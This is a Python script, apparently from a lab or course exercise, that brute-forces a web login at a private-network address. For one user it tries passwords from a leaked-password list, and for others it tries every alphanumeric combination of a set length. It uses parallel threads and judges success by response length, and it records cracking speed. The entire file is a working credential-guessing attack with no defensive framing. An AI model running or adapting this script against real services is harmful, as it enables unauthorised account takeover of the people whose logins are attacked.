
import itertools
import requests
from multiprocessing.dummy import Pool as ThreadPool
import time

pool_size = int(input('Pool-Größe: '))
pool = ThreadPool(pool_size)
user_input = input('Nutzername: ')

combination_array = []
combined = []
test_key_counter = []
passwords = []
check_array = []

url = 'http://172.50.1.5:8080/validate?'
session = requests.Session()

f = open('adobe-top100.txt', 'r')
for line in f:
    line = line.strip()
    columns = line.split()
    passwords.append(columns[3])

f.close()


def create_ingredients():
    password_ingredients = ''

    for i in range(ord('a'), ord('z')+1):
        password_ingredients += chr(i)

    for j in range(ord('A'), ord('Z')+1):
        password_ingredients += chr(j)

    for x in range(10):
        password_ingredients += str(x)
    return password_ingredients


def create_password(ingredients, length):
    combinations = []
    combinations += itertools.product(ingredients, repeat=length)
    print('Anzahl der Kombinationen: ' + str(len(combinations)))
    return combinations


def execute_hack(x):

    global test_key_counter
    if user_input == 'joe':
        local_url = url + 'benutzername=' + user_input + '&passwort=' + passwords[x]
        r = session.get(local_url)
        test_key_counter.append('k')
        if len(r.text) == 21:
            elapsed_time = time.time() - start_time
            print('Versuchsnummer: ' + str(x))
            print(user_input + ' ' + passwords[x])
            print(len(r.text))
            print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
            print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
            print('Getestete Keys: ' + str(len(test_key_counter)))

    else:
        local_url = url + 'benutzername=' + user_input + '&passwort=' + ''.join(combination_array[x])
        r = session.get(local_url)
        test_key_counter.append('k')
        if len(r.text) == 21:
            elapsed_time = time.time() - start_time
            print('Versuchsnummer: ' + str(x))
            print(user_input + ' ' + ''.join(combination_array[x]))
            print(r.text)
            print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
            print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
            print('Getestete Keys: ' + str(len(test_key_counter)))
            d = open('combinations.txt', 'a')
            d.write(user_input + '\t \t \t' + str(round(elapsed_time)) + "\t \t \t \t \t"
                    + str(round(len(test_key_counter) / elapsed_time)) + "\t \t \t \t \t \t" + str(pool_size) + "\n")


if user_input != 'joe':
    password_length = int(input('Wie lang soll das Passwort sein? '))
    print('Ingredients: ' + create_ingredients())
    combination_array = create_password(create_ingredients(), password_length)


if user_input == 'joe':
    range_iteration = range(len(passwords))
else:
    range_iteration = range(len(combination_array))

start_time = time.time()

results_for = pool.map(execute_hack, range_iteration)
